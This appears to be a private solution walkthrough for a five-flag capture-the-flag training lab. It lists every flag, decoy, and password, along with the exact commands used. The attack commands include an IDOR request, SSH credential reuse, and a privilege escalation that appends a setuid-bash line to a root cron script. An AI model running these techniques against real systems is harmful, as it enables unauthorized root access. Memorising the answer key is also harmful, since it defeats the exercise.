# Solution Walkthrough

> Private — never player-accessible. This is the exact path verified
> against the real, built project (not a plan). Every step below has
> actually been run and its output observed in this session.

## Stage 1 — OSINT (Original Flag 1, 100 pts)

Served live by the app, unauthenticated, at `/materials/osint/`
(also present under `challenge-data/stage1-osint/` in this repo).

1. Visit `http://<vm>:8080/` → landing page links to `/materials/` →
   `/materials/osint/profile.html` — username `jtyler_dev`, links
   conceptually to the `ledger-tools` project (mentioned in Activity).
2. **Decoy, loud and first thing on the page**: a boxed-off callout —
   `FFLAG:old_profile_rev1_55c2`, framed as a "cached status badge".
   Fast to find, zero points.
3. `/materials/osint/project-page.html`'s changelog — the real flag is
   woven into the v0.4 line's ordinary prose, not called out
   separately: `...Tagged this build SYN{osint_fingerprint_f0c73a91}
   in case anyone needs to reference it later.` → **Flag 1**. Requires
   reading the line, not just skimming for bold/boxed text.

## Stage 2 — Metadata (Original Flag 2, 100 pts)

Served live at `/materials/metadata/*.png` (also
`challenge-data/stage2-metadata/*.png` in this repo). Two photos only.

1. `exiftool handover_photo.png` → `Comment` field, phrased as a
   casual photo caption: `handover desk photo — SYN{exif_breadcrumb_8d12ff04}`
   → **Flag 2**.
2. **Decoy**: `scan_backup.png`'s `Comment` is a hex-encoded
   ciphertext; its `Artist` field is deliberately loud —
   `PASSWORD (use this to unlock the Comment field!): scanpass2017` —
   decrypts to `FFLAG:draft_scan_metadata_77b0`.

## Stage 3 — Git history + crypto (Original Flag 3, 150 pts)

Served live at `/materials/stage3-git-history.tar.gz` — download,
extract (`tar xzf stage3-git-history.tar.gz`), work inside the
extracted `stage3-git-history/` repo.

1. `git log --oneline` shows 4 commits; the working tree only has
   `README.md`. The commit `Clean up stale backup files` removed 3
   files (2 `.enc`, 1 `.txt`).
2. **Decoy, closer to HEAD (found first scanning log newest-first)**:
   `HEAD~1`'s commit message is loud on purpose — *"Found the old 2018
   backup again! Password is old-wifi-2018, decrypt
   old_backup_2018.enc"*. `git show HEAD~1:old_backup_2018.enc`, decrypt
   with `old-wifi-2018` → `FFLAG:rotated_out_jan_2019_e2a4`. Fast,
   obvious, zero points.
3. The real flag requires going one commit further back and actually
   reading a separate file: `git show HEAD~2:notes.txt` (plain commit
   message this time — "Add encrypted handover backup + passphrase
   note") → passphrase `BlueHarbor-99` (with a quiet aside about the
   *other*, decoy passphrase — easy to misread which is which).
   `git show HEAD~2:handover_backup.enc > backup.enc`, then:
   `python3 tools/flagcrypto.py decrypt BlueHarbor-99 backup.enc -`
   → `SYN{git_ghost_61ace7b2}` → **Flag 3**. **Keep this value** — it's
   the final artifact's password later (Stage 13 of the project spec).

## Stage 4 — Web / IDOR (no flag by itself — unlocks the pivot)

App: seeded `john` / `Summer2019!` (given to players as the starting
foothold — see `player-material/Getting-Started.md`).

1. Log in as `john`. `GET /records/mine` redirects to `/records/1`
   ("Handover notes").
2. **IDOR**: `GET /records/2` — no ownership check, just login —
   reveals the "Admin handover record": the admin web password
   `N3tOps-Diag#7`, with a one-line aside that it's the same password
   on the server itself.

## Stage 4 — Credential reuse (Original Flag 4, 200 pts)

There is no second web vulnerability here — the password reuse itself
*is* the exploit. (An earlier build of this project used an
admin-only command-injection tool for this step; removed by design in
favor of this simpler, equally realistic lesson.)

1. `ssh admin@<vm>` using `N3tOps-Diag#7` — the same credential
   disclosed by the IDOR. SSH password auth is enabled for this one
   account only (`/etc/ssh/sshd_config.d/90-admin-password-auth.conf`,
   a `Match User admin` block); every other account is key-only or
   disabled. Verified live: `id` → `uid=1002(admin) gid=110(admin)
   groups=110(admin)`. `john` gets `Permission denied (publickey)` if
   tried the same way — password auth isn't even offered to him.
2. Once logged in:
   ```
   cat /home/admin/evidence/decrypt_notes.txt
   # original_flag_4.enc -> oldhandoff-rotate-2024
   python3 /opt/tools/flagcrypto.py decrypt oldhandoff-rotate-2024 \
       /home/admin/flags/original_flag_4.enc -
   # SYN{admin_blindspot_9f4e2c18}  -> Flag 4
   ```
3. **Decoy, loud and named for it**: `/home/admin/evidence/FOUND_A_FLAG.txt`
   — *"Found this while cleaning up old tickets, looks like a flag:"* —
   `FFLAG:ticket_closed_wontfix_19d7`. Plaintext, no decryption needed,
   sitting right next to the real evidence.

## Stage 5 — Linux privilege escalation

Full mechanism and rationale: `instructor-material/privesc-design.md`.
Player begins this stage as Linux `admin` (confirmed above, no sudo).

1. `ls -la /etc/cron.d/` → `admin-tools-cleanup`, runs as root every
   minute, executing `/opt/admin-tools/cleanup.sh`.
2. `ls -la /opt/admin-tools/cleanup.sh` → `root:admin`, mode `664`.
   `id` shows `admin` is in group `admin`.
3. Append a command and wait for the next minute's cron tick:
   ```
   echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /opt/admin-tools/cleanup.sh
   sleep 60
   /tmp/rootbash -p -c 'id'
   # uid=1002(admin) gid=110(admin) euid=0(root) groups=110(admin)
   ```
4. Clean up `/tmp/rootbash` when done (or run
   `vm/scripts/reset-privesc.sh` between teams).

## Final artifact (Original Flag 5, 250 pts)

```
python3 /opt/tools/flagcrypto.py decrypt "SYN{git_ghost_61ace7b2}" \
    /root/final_evidence.enc -
# SYN{root_of_all_evidence_3b7d55a0}  -> Flag 5 (250 pts, total 800)
```
Note the password is Flag 3's *decrypted value*, not `BlueHarbor-99`
(Flag 3's own password) and not any Linux account password. Verified: a
wrong password fails; `admin` cannot read `/root` at all
(`Permission denied`) before privilege escalation.

**Decoy, loud and positioned first**: `/root/root_note.txt` opens with
*"Finally got root, huh? Before you get excited:"* then points at
`old_evidence.enc` as if it's the prize — password `SnapshotKey-2023`
right there in the same sentence → decrypts to
`FFLAG:old_root_snapshot_f02e`. The genuine artifact requires the
cross-stage password from Flag 3 instead, which isn't written anywhere
on this box.

## Verified facts (not assumptions)

- All of the above was run for real in this session: the files for
  Stages 1–3, and the live, booted VM over HTTP + SSH for Stage 4,
  Stage 5, and the final artifact — including a genuine `admin` →
  `euid=0` privilege transition with no instructor `sudo` involved, and
  a genuine password-based SSH login with no key. See
  `PROJECT-STATUS.md`'s phase sections for exact commands and output.
- `./scripts/validate-flags.sh` and `./scripts/health-check.sh` both
  pass all checks against the live VM after every change described
  here.
